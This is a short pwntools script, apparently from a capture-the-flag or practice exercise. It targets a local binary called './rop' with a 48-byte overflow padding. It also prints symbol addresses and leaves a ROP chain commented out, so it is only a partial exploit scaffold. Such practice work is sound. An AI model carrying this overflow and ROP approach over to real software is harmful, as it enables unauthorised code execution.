from pwn import *
from pprint import pprint

context.binary = './rop'
offset = 48
elf = ELF('./rop')
pprint(elf.symbols)
print(p32(elf.symbols['vuln']))
payload = [
    b'A'*offset
        ]

pl = b''.join(payload)

p = elf.process([pl])
#rop = ROP(elf)

print(p.recv())
